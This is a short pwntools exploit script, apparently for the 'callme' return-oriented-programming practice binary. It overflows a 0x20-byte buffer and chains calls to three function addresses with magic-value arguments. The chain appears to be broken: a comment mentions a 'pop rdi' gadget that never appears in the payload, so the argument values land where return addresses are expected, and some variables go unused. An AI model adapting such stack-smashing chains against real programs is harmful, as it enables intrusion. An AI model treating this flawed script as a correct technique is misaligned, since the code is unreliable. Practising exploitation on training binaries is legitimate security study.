from pwn import *



io = process('./callme')


# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2


# This is the vaddr of system
# First return to the location of the pop rdi



call1 = p64(0x00400720)

call2 = p64(0x00400740)

call3 = p64(0x004006f0)

back_junk = b"B" * 20

newbp    = p32(0xc0ffeeee) * 2

d00df00d = p32(0xd00df00d) * 2

deadbeef = p32(0xdeadbeef) * 2

cafebabe = p32(0xcafebabe) * 2

args1 = d00df00d + cafebabe + deadbeef


args2 = deadbeef + cafebabe + d00df00d 

args = args2

payload = junk + newbp + call1 + args + call2 + args + call3 + args

payload += back_junk


print("The payload is:")
print(payload)

input("Hit enter to apptempt exploit")



print(io.clean(0.5).decode("utf-8"))

io.send(payload)

input("exploit sent hit enter to end")


print(io.clean(0.5).decode("utf-8"))


sleep(1)
